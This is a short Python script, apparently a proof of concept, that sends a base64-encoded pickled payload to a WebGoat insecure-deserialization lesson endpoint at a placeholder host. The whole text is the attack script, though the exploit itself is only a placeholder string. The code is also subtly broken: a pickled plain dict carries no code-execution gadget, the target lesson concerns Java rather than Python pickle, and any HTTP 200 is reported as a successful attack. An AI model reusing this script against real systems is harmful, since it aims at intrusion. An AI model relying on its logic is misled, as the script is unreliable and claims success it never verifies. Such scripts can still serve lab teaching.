import pickle
import base64
import requests

malicious_payload = pickle.dumps({"exploit": "__EXPLOIT_CODE__"})
encoded_payload = base64.b64encode(malicious_payload).decode()

response = requests.post("http://__HOST_IP__:8080/WebGoat/Deserialization/attack", data={"payload": encoded_payload})
if response.status_code == 200:
    print("[+] Insecure deserialization executed!")
else:
    print(f"[-] Attack failed! HTTP Status Code: {response.status_code}")

